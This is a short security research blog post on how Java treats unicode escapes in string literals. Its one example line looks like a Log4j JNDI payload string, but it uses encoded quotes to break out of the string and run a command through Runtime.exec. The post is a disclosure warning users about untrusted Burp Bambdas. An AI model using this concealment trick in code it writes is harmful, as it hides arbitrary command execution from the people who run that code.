---
source: portswigger-research
source_url: https://portswigger.net/research/hiding-payloads-in-java-source-code-strings
title: "Hiding payloads in Java source code strings | PortSwigger Research"
published: 2024-01-23T15:00:00
description: "In this post we'll show you how Java handles unicode escapes in source code strings in a way you might find surprising - and how you can abuse them to conceal payloads. We recently released a powerful"
---

# Hiding payloads in Java source code strings

![Gareth Heyes](https://portswigger.net/content/images/profiles/callout_gareth_heyes_114px.png)

### [Gareth Heyes](https://portswigger.net/research/gareth-heyes)

Researcher

[@garethheyes](https://twitter.com/garethheyes)

- **Published:** Tuesday, 23 January 2024 at 15:00 UTC

- **Updated:** Wednesday, 24 January 2024 at 12:27 UTC


![Twirling code that shows a calculator at the end to signify RCE](https://portswigger.net/cms/images/28/a4/c2e6-article-hidden-strings-article.png)

In this post we'll show you how Java handles unicode escapes in source code strings in a way you might find surprising - and how you can abuse them to conceal payloads.

We recently released a powerful new feature called
[Bambdas](https://portswigger.net/blog/introducing-bambdas). They allow you to filter items in Burp using Java code. But that got us wondering, what if you could convince a user to run a Bambda that looked like an honest exploit payload but actually executed arbitrary code on the local machine?

What do you expect would happen when you use the following in a Bambda:

`var log4jpayload = "%24%7Bjndi:ldap://psres.net/\u0022;Runtime.getRuntime().exec(\u0022open -a calculator\u0022);//%7D";
`

If you were expecting a simple string assignment you'd be wrong. What actually happens is the Java compiler treats the unicode encoded double quote (\\u0022) as a double quote and closes the string. Then Runtime.getRuntime() is executed along with the command passed with an encoded string. Java pretty much allows you to encode the entire syntax with unicode escapes!

We couldn't find this technique publicly documented anywhere, but if you liked this you can find a bunch of related attacks in this
[paper](https://trojansource.codes/trojan-source.pdf).

**Remember a Bambda allows arbitrary code execution so when using one from an untrusted source make sure you validate it before using it!**

[RCE](https://portswigger.net/research/rce) [Java](https://portswigger.net/research/java)

[Back to all articles](https://portswigger.net/research/articles)

## Related Research

[**RCE in JXBrowser JavaScript/Java bridge** 08 December 2016RCE in JXBrowser JavaScript/Java bridge](https://portswigger.net/research/rce-in-jxbrowser-javascript-java-bridge) [**Server-Side Template Injection** 05 August 2015Server-Side Template Injection](https://portswigger.net/research/server-side-template-injection)